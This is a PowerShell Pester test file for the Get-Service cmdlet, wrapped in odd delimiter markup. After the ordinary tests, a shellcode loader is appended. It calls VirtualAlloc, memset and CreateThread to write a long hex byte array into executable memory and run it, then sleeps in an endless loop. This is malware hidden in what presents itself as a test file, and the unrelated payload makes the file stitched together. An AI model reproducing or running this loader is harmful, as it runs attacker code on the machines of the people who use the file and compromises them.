

 -||-> Describe "Get-Service cmdlet tests" -Tags "CI" {
  
  
   -||-> BeforeAll {
     -||-> $originalDefaultParameterValues = $PSDefaultParameterValues.Clone() <-||- 
     -||-> if (  -||-> -not $IsWindows <-||-  ) {
         -||-> $PSDefaultParameterValues["it:skip"] = $true <-||- 
    } <-||- 
  } <-||- 
  
   -||-> AfterAll {
       -||-> $global:PSDefaultParameterValues = $originalDefaultParameterValues <-||- 
  } <-||- 

   -||-> $testCases =
    @{ data =  -||-> $null <-||-           ; value =  -||-> 'null' <-||-  },
    @{ data =  -||-> [String]::Empty <-||- ; value =  -||-> 'empty string' <-||-  } <-||- 

   -||-> Context 'Check null or empty value to the -Name parameter' {
     -||-> It 'Should throw if <value> is passed to -Name parameter' -TestCases $testCases {
      param($data)
       -||-> {  -||-> $null =  -||-> Get-Service -Name $data -ErrorAction Stop <-||-  <-||-  } |
        Should -Throw -ErrorId 'ParameterArgumentValidationError,Microsoft.Powershell.Commands.GetServiceCommand' <-||- 
    } <-||- 
  } <-||- 

   -||-> Context 'Check null or empty value to the -Name parameter via pipeline' {
     -||-> It 'Should throw if <value> is passed through pipeline to -Name parameter' -TestCases $testCases {
      param($data)
       -||-> {  -||-> $null =  -||-> Get-Service -Name $data -ErrorAction Stop <-||-  <-||-  } |
        Should -Throw -ErrorId 'ParameterArgumentValidationError,Microsoft.Powershell.Commands.GetServiceCommand' <-||- 
    } <-||- 
  } <-||- 

   -||-> It "GetServiceCommand can be used as API for '<parameter>' with '<value>'" -TestCases @(
     -||-> @{ parameter =  -||-> "DisplayName" <-||-  ; value =  -||-> "foo" <-||-  },
    @{ parameter =  -||-> "Include" <-||-      ; value =  -||-> "foo","bar" <-||-  },
    @{ parameter =  -||-> "Exclude" <-||-      ; value =  -||-> "bar","foo" <-||-  },
    @{ parameter =  -||-> "InputObject" <-||-  ; script =  -||-> {  -||-> Get-Service | Select-Object -First 1 <-||-  } <-||-  },
    @{ parameter =  -||-> "Name" <-||-         ; value =  -||-> "foo","bar" <-||-  } <-||- 
  ) {
    param($parameter, $value, $script)
     -||-> if ( -||-> $script -ne $null <-||- ) {
       -||-> $value =  -||-> & $script <-||-  <-||- 
    } <-||- 

     -||-> $getservicecmd = [Microsoft.PowerShell.Commands.GetServiceCommand]::new() <-||- 
     -||-> $getservicecmd.$parameter = $value <-||- 
     -||-> $getservicecmd.$parameter | Should -BeExactly $value <-||- 
  } <-||- 

   -||-> It "Get-Service filtering works for '<script>'" -TestCases @(
     -||-> @{ script =  -||-> {  -||-> Get-Service -DisplayName Net* <-||-  } <-||-                ; expected =  -||-> {  -||-> Get-Service | Where-Object {  -||-> $_.DisplayName -like 'Net*' <-||-  } <-||-  } <-||-  },
    @{ script =  -||-> {  -||-> Get-Service -Include Net* -Exclude *logon <-||-  } <-||-    ; expected =  -||-> {  -||-> Get-Service | Where-Object {  -||-> $_.Name -match '^net.*?(?<!logon)$' <-||-  } <-||-  } <-||-  } <-||- 
     -||-> @{ script =  -||-> {  -||-> Get-Service -Name Net* | Get-Service <-||-  } <-||-         ; expected =  -||-> {  -||-> Get-Service -Name Net* <-||-  } <-||-  },
    @{ script =  -||-> {  -||-> Get-Service -Name "$( -||-> new-guid <-||- )*" <-||-  } <-||-             ; expected =  -||-> $null <-||-  },
    @{ script =  -||-> {  -||-> Get-Service -DisplayName "$( -||-> new-guid <-||- )*" <-||-  } <-||-      ; expected =  -||-> $null <-||-  },
    @{ script =  -||-> {  -||-> Get-Service -DependentServices -Name winmgmt <-||-  } <-||- ; expected =  -||-> {  -||-> ( -||-> Get-Service -Name winmgmt <-||- ).DependentServices <-||-  } <-||-  },
    @{ script =  -||-> {  -||-> Get-Service -RequiredServices -Name winmgmt <-||-  } <-||-  ; expected =  -||-> {  -||-> ( -||-> Get-Service -name winmgmt <-||- ).RequiredServices <-||-  } <-||-  } <-||- 
  ) {
    param($script, $expected)
     -||-> $services =  -||-> & $script <-||-  <-||- 
     -||-> if ( -||-> $expected -ne $null <-||- ) {
       -||-> $servicesCheck =  -||-> & $expected <-||-  <-||- 
    } <-||- 
     -||-> if ( -||-> $servicesCheck -ne $null <-||- ) {
       -||-> Compare-object $services $servicesCheck | Out-String | Should -BeNullOrEmpty <-||- 
    } else {
       -||-> $services | Should -BeNullOrEmpty <-||- 
    } <-||- 
  } <-||- 

   -||-> It "Get-Service fails for non-existing service using '<script>'" -TestCases @(
     -||-> @{ script  =  -||-> {  -||-> Get-Service -Name ( -||-> new-guid <-||- ) -ErrorAction Stop <-||- } <-||-        ;
       ErrorId =  -||-> "NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.GetServiceCommand" <-||-  },
    @{ script  =  -||-> {  -||-> Get-Service -DisplayName ( -||-> new-guid <-||- ) -ErrorAction Stop <-||- } <-||- ;
       ErrorId =  -||-> "NoServiceFoundForGivenDisplayName,Microsoft.PowerShell.Commands.GetServiceCommand" <-||-  } <-||- 
  ) {
    param($script,$errorid)
     -||-> {  -||-> & $script <-||-  } | Should -Throw -ErrorId $errorid <-||- 
  } <-||- 
} <-||- 

 -||-> $BcV = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $BcV -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xce,0xd9,0x74,0x24,0xf4,0x5a,0xb8,0xfb,0xde,0xd9,0x44,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xea,0xfc,0x03,0x42,0xef,0x3c,0x2c,0xb8,0xe7,0x43,0xcf,0x41,0xf7,0x23,0x59,0xa4,0xc6,0x63,0x3d,0xac,0x78,0x54,0x35,0xe0,0x74,0x1f,0x1b,0x11,0x0f,0x6d,0xb4,0x16,0xb8,0xd8,0xe2,0x19,0x39,0x70,0xd6,0x38,0xb9,0x8b,0x0b,0x9b,0x80,0x43,0x5e,0xda,0xc5,0xbe,0x93,0x8e,0x9e,0xb5,0x06,0x3f,0xab,0x80,0x9a,0xb4,0xe7,0x05,0x9b,0x29,0xbf,0x24,0x8a,0xff,0xb4,0x7e,0x0c,0x01,0x19,0x0b,0x05,0x19,0x7e,0x36,0xdf,0x92,0xb4,0xcc,0xde,0x72,0x85,0x2d,0x4c,0xbb,0x2a,0xdc,0x8c,0xfb,0x8c,0x3f,0xfb,0xf5,0xef,0xc2,0xfc,0xc1,0x92,0x18,0x88,0xd1,0x34,0xea,0x2a,0x3e,0xc5,0x3f,0xac,0xb5,0xc9,0xf4,0xba,0x92,0xcd,0x0b,0x6e,0xa9,0xe9,0x80,0x91,0x7e,0x78,0xd2,0xb5,0x5a,0x21,0x80,0xd4,0xfb,0x8f,0x67,0xe8,0x1c,0x70,0xd7,0x4c,0x56,0x9c,0x0c,0xfd,0x35,0xc8,0xe1,0xcc,0xc5,0x08,0x6e,0x46,0xb5,0x3a,0x31,0xfc,0x51,0x76,0xba,0xda,0xa6,0x79,0x91,0x9b,0x39,0x84,0x1a,0xdc,0x10,0x42,0x4e,0x8c,0x0a,0x63,0xef,0x47,0xcb,0x8c,0x3a,0xfd,0xce,0x1a,0x05,0xaa,0xd0,0xbc,0xed,0xa9,0xd2,0x51,0xb2,0x24,0x34,0x01,0x1a,0x67,0xe9,0xe1,0xca,0xc7,0x59,0x89,0x00,0xc8,0x86,0xa9,0x2a,0x02,0xaf,0x43,0xc5,0xfb,0x87,0xfb,0x7c,0xa6,0x5c,0x9a,0x81,0x7c,0x19,0x9c,0x0a,0x73,0xdd,0x52,0xfb,0xfe,0xcd,0x02,0x0b,0xb5,0xac,0x84,0x14,0x63,0xda,0x28,0x81,0x88,0x4d,0x7f,0x3d,0x93,0xa8,0xb7,0xe2,0x6c,0x9f,0xcc,0x2b,0xf9,0x60,0xba,0x53,0xed,0x60,0x3a,0x02,0x67,0x61,0x52,0xf2,0xd3,0x32,0x47,0xfd,0xc9,0x26,0xd4,0x68,0xf2,0x1e,0x89,0x3b,0x9a,0x9c,0xf4,0x0c,0x05,0x5e,0xd3,0x8c,0x79,0x89,0x1d,0xfb,0x93,0x09 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $BMk=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $BMk.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$BMk,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



